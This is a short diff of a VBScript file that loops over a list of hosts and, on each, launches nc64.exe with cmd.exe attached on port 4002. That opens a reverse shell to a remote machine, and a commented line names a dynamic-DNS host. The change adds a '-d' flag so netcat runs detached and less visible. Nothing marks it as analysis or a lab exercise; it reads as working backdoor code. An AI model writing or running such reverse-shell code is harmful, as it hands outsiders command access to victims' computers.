@@ -24,7 +24,7 @@ if brun then
   for each x in a
       'msgbox x
       'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
-      oShell.run "nc64.exe -w 10 -e cmd.exe "&x&" 4002"
+      oShell.run "nc64.exe -d -w 10 -e cmd.exe "&x&" 4002"
       WScript.Sleep 100
   next
 end if
